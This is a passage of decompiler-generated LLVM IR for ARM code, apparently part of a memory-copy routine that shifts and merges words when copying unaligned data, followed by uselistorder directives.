  %v3_15b4c = load i32, i32* %v2_15b4c, align 4
  store i32 %v3_15b4c, i32* @r3, align 4
  %v4_15b4c = add i32 %v0_15b4c, -8
  %v5_15b4c = inttoptr i32 %v4_15b4c to i32*
  %v6_15b4c = load i32, i32* %v5_15b4c, align 4
  store i32 %v6_15b4c, i32* %r4.global-to-local, align 4
  %v7_15b4c = add i32 %v0_15b4c, -12
  %v8_15b4c = inttoptr i32 %v7_15b4c to i32*
  %v9_15b4c = load i32, i32* %v8_15b4c, align 4
  store i32 %v9_15b4c, i32* %r5.global-to-local, align 4
  %v10_15b4c = add i32 %v0_15b4c, -16
  %v11_15b4c = inttoptr i32 %v10_15b4c to i32*
  %v12_15b4c = load i32, i32* %v11_15b4c, align 4
  store i32 %v10_15b4c, i32* %r1.global-to-local, align 4
  %v4_15b50 = udiv i32 %v12_15b4c, 65536
  %v5_15b50 = or i32 %v4_15b50, %v3_15b48
  store i32 %v5_15b50, i32* %lr.global-to-local, align 4
  %v3_15b54 = mul i32 %v12_15b4c, 65536
  %v4_15b58 = udiv i32 %v9_15b4c, 65536
  %v5_15b58 = or i32 %v3_15b54, %v4_15b58
  store i32 %v5_15b58, i32* @ip, align 4
  %v3_15b5c = mul i32 %v9_15b4c, 65536
  %v4_15b60 = udiv i32 %v6_15b4c, 65536
  %v5_15b60 = or i32 %v3_15b5c, %v4_15b60
  store i32 %v5_15b60, i32* %r5.global-to-local, align 4
  %v3_15b64 = mul i32 %v6_15b4c, 65536
  %v4_15b68 = udiv i32 %v3_15b4c, 65536
  %v5_15b68 = or i32 %v3_15b64, %v4_15b68
  store i32 %v5_15b68, i32* %r4.global-to-local, align 4
  %v1_15b6c = add i32 %v0_15b6c, -16
  %v2_15b6c = inttoptr i32 %v1_15b6c to i32*
  store i32 %v5_15b68, i32* %v2_15b6c, align 4
  %v4_15b6c = add i32 %v0_15b6c, -12
  %v5_15b6c = inttoptr i32 %v4_15b6c to i32*
  %v6_15b6c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15b6c, i32* %v5_15b6c, align 4
  %v7_15b6c = add i32 %v0_15b6c, -8
  %v8_15b6c = inttoptr i32 %v7_15b6c to i32*
  %v9_15b6c = load i32, i32* @ip, align 4
  store i32 %v9_15b6c, i32* %v8_15b6c, align 4
  %v10_15b6c = add i32 %v0_15b6c, -4
  %v11_15b6c = inttoptr i32 %v10_15b6c to i32*
  %v12_15b6c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15b6c, i32* %v11_15b6c, align 4
  store i32 %v1_15b6c, i32* %r0.global-to-local, align 4
  %v0_15b70 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b70 = add i32 %v0_15b70, -16
  store i32 %v2_15b70, i32* %r2.global-to-local, align 4
  %v6_15b74 = icmp slt i32 %v0_15b70, 16
  br i1 %v6_15b74, label %dec_label_pc_15b78, label %dec_label_pc_15b48.dec_label_pc_15b48_crit_edge

dec_label_pc_15b48.dec_label_pc_15b48_crit_edge:  ; preds = %dec_label_pc_15b48
  %v0_15b48.pre = load i32, i32* @r3, align 4
  %v0_15b4c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15b48

dec_label_pc_15b78:                               ; preds = %dec_label_pc_15b48
  %v2_15b78 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15b78, i32* @r4, align 4
  %v5_15b78 = load i8*, i8** %stack_var_-8, align 4
  %v6_15b78 = ptrtoint i8* %v5_15b78 to i32
  store i32 %v6_15b78, i32* @r5, align 4
  store i32 %v11_15b44, i32* @lr, align 4
  %v2_15b7c = add i32 %v0_15b70, -4
  store i32 %v2_15b7c, i32* %r2.global-to-local, align 4
  %v4_15b7c = add i32 %v0_15b70, 2147483632
  %v5_15b7c = and i32 %v2_15b7c, %v4_15b7c
  %v6_15b7c = icmp slt i32 %v5_15b7c, 0
  store i1 %v6_15b7c, i1* %cpsr_v.global-to-local, align 1
  %v7_15b7c = icmp slt i32 %v2_15b7c, 0
  store i1 %v7_15b7c, i1* %cpsr_n.global-to-local, align 1
  %v8_15b7c = icmp eq i32 %v2_15b7c, 0
  store i1 %v8_15b7c, i1* %cpsr_z.global-to-local, align 1
  %v5_15b80 = icmp slt i32 %v2_15b70, -12
  br i1 %v5_15b80, label %dec_label_pc_15b9c, label %dec_label_pc_15b84

dec_label_pc_15b84:                               ; preds = %dec_label_pc_15b78, %dec_label_pc_15b38, %dec_label_pc_15b84
  %v1_15b90 = phi i32 [ %v5_15b90, %dec_label_pc_15b84 ], [ %v1_15b6c, %dec_label_pc_15b78 ], [ %v0_15b0019, %dec_label_pc_15b38 ]
  %v0_15b84 = load i32, i32* @r3, align 4
  %v3_15b84 = mul i32 %v0_15b84, 65536
  store i32 %v3_15b84, i32* %ip.global-to-local, align 4
  %v0_15b88 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b88 = add i32 %v0_15b88, -4
  %v2_15b88 = inttoptr i32 %v1_15b88 to i32*
  %v3_15b88 = load i32, i32* %v2_15b88, align 4
  store i32 %v3_15b88, i32* @r3, align 4
  store i32 %v1_15b88, i32* %r1.global-to-local, align 4
  %v4_15b8c = udiv i32 %v3_15b88, 65536
  %v5_15b8c = or i32 %v4_15b8c, %v3_15b84
  store i32 %v5_15b8c, i32* @ip, align 4
  %v2_15b90 = add i32 %v1_15b90, -4
  %v3_15b90 = inttoptr i32 %v2_15b90 to i32*
  store i32 %v5_15b8c, i32* %v3_15b90, align 4
  %v4_15b90 = load i32, i32* %r0.global-to-local, align 4
  %v5_15b90 = add i32 %v4_15b90, -4
  store i32 %v5_15b90, i32* %r0.global-to-local, align 4
  %v0_15b94 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b94 = add i32 %v0_15b94, -4
  store i32 %v2_15b94, i32* %r2.global-to-local, align 4
  %v6_15b98 = icmp slt i32 %v0_15b94, 4
  br i1 %v6_15b98, label %dec_label_pc_15b9c.loopexit, label %dec_label_pc_15b84

dec_label_pc_15b9c.loopexit:                      ; preds = %dec_label_pc_15b84
  %v4_15b94 = sub i32 3, %v0_15b94
  %v5_15b94 = and i32 %v4_15b94, %v0_15b94
  %v6_15b94 = icmp slt i32 %v5_15b94, 0
  %v7_15b94 = icmp slt i32 %v2_15b94, 0
  store i1 %v6_15b94, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15b94, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15b9c

dec_label_pc_15b9c:                               ; preds = %dec_label_pc_15b9c.loopexit, %dec_label_pc_15b78
  %v2_15a7452 = phi i32 [ %v5_15b90, %dec_label_pc_15b9c.loopexit ], [ %v1_15b6c, %dec_label_pc_15b78 ]
  %v0_15a6448 = phi i32 [ %v2_15b94, %dec_label_pc_15b9c.loopexit ], [ %v2_15b7c, %dec_label_pc_15b78 ]
  %v0_15b9c = load i32, i32* %r1.global-to-local, align 4
  %v1_15b9c = add i32 %v0_15b9c, 2
  store i32 %v1_15b9c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_15ba4:                               ; preds = %dec_label_pc_15ab8
  br i1 %v5_15ba8, label %dec_label_pc_15bf0, label %dec_label_pc_15bac

dec_label_pc_15bac:                               ; preds = %dec_label_pc_15ba4
  store i32 %v2_15ba4, i32* %r2.global-to-local, align 4
  %v3_15bb0 = load i32, i32* @r4, align 4
  store i32 %v3_15bb0, i32* %stack_var_-12, align 4
  %v6_15bb0 = load i32, i32* @r5, align 4
  %v8_15bb0 = inttoptr i32 %v6_15bb0 to i8*
  store i8* %v8_15bb0, i8** %stack_var_-8, align 4
  %v11_15bb0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15bb4

dec_label_pc_15bb4:                               ; preds = %dec_label_pc_15bb4.dec_label_pc_15bb4_crit_edge, %dec_label_pc_15bac
  %v0_15bd8 = phi i32 [ %v1_15bd8, %dec_label_pc_15bb4.dec_label_pc_15bb4_crit_edge ], [ %v0_15b0019, %dec_label_pc_15bac ]
  %v0_15bb8 = phi i32 [ %v0_15bb8.pre, %dec_label_pc_15bb4.dec_label_pc_15bb4_crit_edge ], [ %v1_15ab8, %dec_label_pc_15bac ]
  %v0_15bb4 = phi i32 [ %v0_15bb4.pre, %dec_label_pc_15bb4.dec_label_pc_15bb4_crit_edge ], [ %v2_15abc, %dec_label_pc_15bac ]
  %v3_15bb4 = mul i32 %v0_15bb4, 16777216
  store i32 %v3_15bb4, i32* %lr.global-to-local, align 4
  %v1_15bb8 = add i32 %v0_15bb8, -4
  %v2_15bb8 = inttoptr i32 %v1_15bb8 to i32*
  %v3_15bb8 = load i32, i32* %v2_15bb8, align 4
  store i32 %v3_15bb8, i32* @r3, align 4
  %v4_15bb8 = add i32 %v0_15bb8, -8
  %v5_15bb8 = inttoptr i32 %v4_15bb8 to i32*
  %v6_15bb8 = load i32, i32* %v5_15bb8, align 4
  store i32 %v6_15bb8, i32* %r4.global-to-local, align 4
  %v7_15bb8 = add i32 %v0_15bb8, -12
  %v8_15bb8 = inttoptr i32 %v7_15bb8 to i32*
  %v9_15bb8 = load i32, i32* %v8_15bb8, align 4
  store i32 %v9_15bb8, i32* %r5.global-to-local, align 4
  %v10_15bb8 = add i32 %v0_15bb8, -16
  %v11_15bb8 = inttoptr i32 %v10_15bb8 to i32*
  %v12_15bb8 = load i32, i32* %v11_15bb8, align 4
  store i32 %v10_15bb8, i32* %r1.global-to-local, align 4
  %v4_15bbc = udiv i32 %v12_15bb8, 256
  %v5_15bbc = or i32 %v4_15bbc, %v3_15bb4
  store i32 %v5_15bbc, i32* %lr.global-to-local, align 4
  %v3_15bc0 = mul i32 %v12_15bb8, 16777216
  %v4_15bc4 = udiv i32 %v9_15bb8, 256
  %v5_15bc4 = or i32 %v3_15bc0, %v4_15bc4
  store i32 %v5_15bc4, i32* @ip, align 4
  %v3_15bc8 = mul i32 %v9_15bb8, 16777216
  %v4_15bcc = udiv i32 %v6_15bb8, 256
  %v5_15bcc = or i32 %v3_15bc8, %v4_15bcc
  store i32 %v5_15bcc, i32* %r5.global-to-local, align 4
  %v3_15bd0 = mul i32 %v6_15bb8, 16777216
  %v4_15bd4 = udiv i32 %v3_15bb8, 256
  %v5_15bd4 = or i32 %v3_15bd0, %v4_15bd4
  store i32 %v5_15bd4, i32* %r4.global-to-local, align 4
  %v1_15bd8 = add i32 %v0_15bd8, -16
  %v2_15bd8 = inttoptr i32 %v1_15bd8 to i32*
  store i32 %v5_15bd4, i32* %v2_15bd8, align 4
  %v4_15bd8 = add i32 %v0_15bd8, -12
  %v5_15bd8 = inttoptr i32 %v4_15bd8 to i32*
  %v6_15bd8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15bd8, i32* %v5_15bd8, align 4
  %v7_15bd8 = add i32 %v0_15bd8, -8
  %v8_15bd8 = inttoptr i32 %v7_15bd8 to i32*
  %v9_15bd8 = load i32, i32* @ip, align 4
  store i32 %v9_15bd8, i32* %v8_15bd8, align 4
  %v10_15bd8 = add i32 %v0_15bd8, -4
  %v11_15bd8 = inttoptr i32 %v10_15bd8 to i32*
  %v12_15bd8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15bd8, i32* %v11_15bd8, align 4
  store i32 %v1_15bd8, i32* %r0.global-to-local, align 4
  %v0_15bdc = load i32, i32* %r2.global-to-local, align 4
  %v2_15bdc = add i32 %v0_15bdc, -16
  store i32 %v2_15bdc, i32* %r2.global-to-local, align 4
  %v6_15be0 = icmp slt i32 %v0_15bdc, 16
  br i1 %v6_15be0, label %dec_label_pc_15be4, label %dec_label_pc_15bb4.dec_label_pc_15bb4_crit_edge

dec_label_pc_15bb4.dec_label_pc_15bb4_crit_edge:  ; preds = %dec_label_pc_15bb4
  %v0_15bb4.pre = load i32, i32* @r3, align 4
  %v0_15bb8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15bb4

dec_label_pc_15be4:                               ; preds = %dec_label_pc_15bb4
  %v2_15be4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15be4, i32* @r4, align 4
  %v5_15be4 = load i8*, i8** %stack_var_-8, align 4
  %v6_15be4 = ptrtoint i8* %v5_15be4 to i32
  store i32 %v6_15be4, i32* @r5, align 4
  store i32 %v11_15bb0, i32* @lr, align 4
  %v2_15be8 = add i32 %v0_15bdc, -4
  store i32 %v2_15be8, i32* %r2.global-to-local, align 4
  %v4_15be8 = add i32 %v0_15bdc, 2147483632
  %v5_15be8 = and i32 %v2_15be8, %v4_15be8
  %v6_15be8 = icmp slt i32 %v5_15be8, 0
  store i1 %v6_15be8, i1* %cpsr_v.global-to-local, align 1
  %v7_15be8 = icmp slt i32 %v2_15be8, 0
  store i1 %v7_15be8, i1* %cpsr_n.global-to-local, align 1
  %v8_15be8 = icmp eq i32 %v2_15be8, 0
  store i1 %v8_15be8, i1* %cpsr_z.global-to-local, align 1
  %v5_15bec = icmp slt i32 %v2_15bdc, -12
  br i1 %v5_15bec, label %dec_label_pc_15c08, label %dec_label_pc_15bf0

dec_label_pc_15bf0:                               ; preds = %dec_label_pc_15be4, %dec_label_pc_15ba4, %dec_label_pc_15bf0
  %v1_15bfc = phi i32 [ %v5_15bfc, %dec_label_pc_15bf0 ], [ %v1_15bd8, %dec_label_pc_15be4 ], [ %v0_15b0019, %dec_label_pc_15ba4 ]
  %v0_15bf0 = load i32, i32* @r3, align 4
  %v3_15bf0 = mul i32 %v0_15bf0, 16777216
  store i32 %v3_15bf0, i32* %ip.global-to-local, align 4
  %v0_15bf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15bf4 = add i32 %v0_15bf4, -4
  %v2_15bf4 = inttoptr i32 %v1_15bf4 to i32*
  %v3_15bf4 = load i32, i32* %v2_15bf4, align 4
  store i32 %v3_15bf4, i32* @r3, align 4
  store i32 %v1_15bf4, i32* %r1.global-to-local, align 4
  %v4_15bf8 = udiv i32 %v3_15bf4, 256
  %v5_15bf8 = or i32 %v4_15bf8, %v3_15bf0
  store i32 %v5_15bf8, i32* @ip, align 4
  %v2_15bfc = add i32 %v1_15bfc, -4
  %v3_15bfc = inttoptr i32 %v2_15bfc to i32*
  store i32 %v5_15bf8, i32* %v3_15bfc, align 4
  %v4_15bfc = load i32, i32* %r0.global-to-local, align 4
  %v5_15bfc = add i32 %v4_15bfc, -4
  store i32 %v5_15bfc, i32* %r0.global-to-local, align 4
  %v0_15c00 = load i32, i32* %r2.global-to-local, align 4
  %v2_15c00 = add i32 %v0_15c00, -4
  store i32 %v2_15c00, i32* %r2.global-to-local, align 4
  %v6_15c04 = icmp slt i32 %v0_15c00, 4
  br i1 %v6_15c04, label %dec_label_pc_15c08.loopexit, label %dec_label_pc_15bf0

dec_label_pc_15c08.loopexit:                      ; preds = %dec_label_pc_15bf0
  %v4_15c00 = sub i32 3, %v0_15c00
  %v5_15c00 = and i32 %v4_15c00, %v0_15c00
  %v6_15c00 = icmp slt i32 %v5_15c00, 0
  %v7_15c00 = icmp slt i32 %v2_15c00, 0
  store i1 %v6_15c00, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15c00, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c08

dec_label_pc_15c08:                               ; preds = %dec_label_pc_15c08.loopexit, %dec_label_pc_15be4
  %v2_15a7453 = phi i32 [ %v5_15bfc, %dec_label_pc_15c08.loopexit ], [ %v1_15bd8, %dec_label_pc_15be4 ]
  %v0_15a6449 = phi i32 [ %v2_15c00, %dec_label_pc_15c08.loopexit ], [ %v2_15be8, %dec_label_pc_15be4 ]
  %v0_15c08 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c08 = add i32 %v0_15c08, 1
  store i32 %v1_15c08, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_15bfc, { 0, 2, 1 }
  uselistorder i32 %v3_15bf0, { 1, 0 }
  uselistorder i32 %v2_15be8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15bd8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15bb8, { 1, 0 }
  uselistorder i32 %v3_15bb4, { 1, 0 }
  uselistorder i32 %v0_15bb8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15bd8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15b90, { 0, 2, 1 }
  uselistorder i32 %v3_15b84, { 1, 0 }
  uselistorder i32 %v2_15b7c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15b6c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15b4c, { 1, 0 }
  uselistorder i32 %v3_15b48, { 1, 0 }
  uselistorder i32 %v0_15b4c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15b6c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15b24, { 0, 2, 1 }
  uselistorder i32 %v3_15b18, { 1, 0 }
  uselistorder i32 %v2_15b10, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15b00, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15ae0, { 1, 0 }
  uselistorder i32 %v3_15adc, { 1, 0 }
  uselistorder i32 %v0_15ae0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15b00, { 3, 2, 1, 0 }
  uselistorder i1 %v5_15ba8, { 2, 0, 1 }
  uselistorder i32 %v0_15ac0, { 1, 0 }
  uselistorder i32 %v0_15bac, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_15b0019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_15ab0, { 2, 1, 0 }
  uselistorder i32 %v0_15ab0, { 2, 0, 1 }
  uselistorder i32 %v2_15aa8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_15aa8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15aa8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_15b0020, { 2, 1, 0 }
  uselistorder i32 %v11_15a84, { 1, 0 }
  uselistorder i32 %v7_15a84, { 1, 0 }
  uselistorder i32 %v1_15a64, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15a64, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15a68, { 1, 0 }
  uselistorder i32 %v7_15a5c, { 0, 2, 1 }
  uselistorder i32 %v10_15a58, { 1, 0 }
  uselistorder i32 %v9_15a50, { 1, 0, 2 }
  uselistorder i32 %v6_15a4c, { 1, 0 }
  uselistorder i32 %v2_15a44, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_15a44, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15a54, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15a38, { 0, 2, 1 }
  uselistorder i32 %v13_15a34, { 1, 0 }
  uselistorder i32 %v4_15a30, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_15a30, { 2, 0, 1 }
  uselistorder i32 %v6_15a38, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15a28, { 0, 2, 1 }
  uselistorder i32 %v16_15a24, { 1, 0 }
  uselistorder i32 %v4_15a20, { 1, 2, 0 }
  uselistorder i32 %v0_15a30.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15a28, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15a14, { 0, 3, 2, 1 }
  uselistorder i32 %v10_15a10, { 1, 0 }
  uselistorder i32 %v1_15a0c, { 1, 0 }
  uselistorder i32 %v10_15a08, { 1, 0 }
  uselistorder i32 %v0_15a08, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15a0c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_15a00, { 0, 2, 1 }
  uselistorder i32 %v2_159f4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_159f4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_15a0c37, { 1, 2, 0 }
  uselistorder i32 %v1_159ec, { 2, 1, 0 }
  uselistorder i32 %v1_159e4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_159dc, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_159d8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_159d4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_159d4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_159c4, { 0, 2, 1 }
  uselistorder i32 %v4_159c0, { 1, 0 }
  uselistorder i32 %v3_159b4, { 1, 0 }
  uselistorder i32 %v1_159ac, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_159a0, { 1, 0 }
  uselistorder i32 %v12_1599c, { 0, 2, 1 }
  uselistorder i32 %v8_1597c, { 1, 0, 2 }
  uselistorder i32 %v5_1597c, { 1, 0, 2 }
  uselistorder i32 %v2_1597c, { 1, 0, 2 }
  uselistorder i32 %v0_1597c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1599c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_15958, { 0, 2, 1 }
  uselistorder i32 %v4_15954, { 1, 0 }
  uselistorder i32 %v3_15948, { 1, 0 }
  uselistorder i32 %v1_15940, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15934, { 1, 0 }
  uselistorder i32 %v12_15930, { 0, 2, 1 }
  uselistorder i32 %v8_15910, { 1, 0, 2 }
  uselistorder i32 %v5_15910, { 1, 0, 2 }
  uselistorder i32 %v2_15910, { 1, 0, 2 }
  uselistorder i32 %v0_15910, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15930, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_158ec, { 0, 2, 1 }
  uselistorder i32 %v4_158e8, { 1, 0 }
  uselistorder i32 %v3_158dc, { 1, 0 }
  uselistorder i32 %v1_158d4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_158c8, { 1, 0 }
  uselistorder i32 %v12_158c4, { 0, 2, 1 }
  uselistorder i32 %v8_158a4, { 1, 0, 2 }
  uselistorder i32 %v5_158a4, { 1, 0, 2 }
  uselistorder i32 %v2_158a4, { 1, 0, 2 }
  uselistorder i32 %v0_158a4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_158c4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_15900, { 0, 2, 1 }
  uselistorder i32 %v1_158fc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_15880, { 2, 0, 1, 3 }
  uselistorder i32 %v2_15880, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15904, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1599c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_15874, { 1, 0 }
  uselistorder i32 %v0_15874, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1586c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1586c, { 1, 0, 2 }
  uselistorder i32 %v0_1586c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1599c77, { 1, 0 }
  uselistorder i32 %v1_1584c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_15854, { 1, 0 }
  uselistorder i32 %v0_15828, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1581c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_15808, { 1, 0, 2 }
  uselistorder i32 %v1_15804, { 1, 0 }
  uselistorder i32 %v1_157fc, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_157fc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_157f4, { 0, 2, 1 }
  uselistorder i32 %v3_157f4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_157f4, { 1, 0 }
  uselistorder i1 %v1_157f4, { 1, 0 }
  uselistorder i32 %v3_157f0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_157e8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_157d4, { 1, 2, 0 }
  uselistorder i32 %v1_157cc, { 0, 2, 1 }
  uselistorder i32 %v12_157c8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_157bc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_157c0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_157b0, { 0, 2, 1 }
  uselistorder i32 %v1_157a8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_157a8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_157a0, { 1, 0 }
  uselistorder i32 %v1_15798, { 2, 1, 0 }
  uselistorder i32 %v2_15790, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_15790, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1578c, { 1, 0 }
  uselistorder i32 %v2_15780, { 1, 0 }
  uselistorder i32 %v1_15780, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_15780, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 1, 25, 0, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 2, 6, 3, 7, 4, 8, 5, 9 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 60, 61, 62, 6, 18, 19, 20, 63, 64, 65, 7, 21, 22, 23, 66, 67, 68, 8, 24, 25, 69, 16, 15, 70, 71, 72, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 73, 10, 33, 41, 42, 43, 9, 44, 45, 46, 34, 40, 2, 35, 47, 48, 49, 50, 51, 52, 0, 1, 53, 54, 55, 56, 57, 58, 59, 36, 37, 38, 39 }
  uselistorder label %dec_label_pc_15bf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15ab8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_15a44, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_15a08, { 1, 0 }
  uselistorder label %dec_label_pc_159f4, { 1, 0 }
  uselistorder label %dec_label_pc_159b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15948, { 2, 0, 1 }
  uselistorder label %dec_label_pc_158dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1587c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1584c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
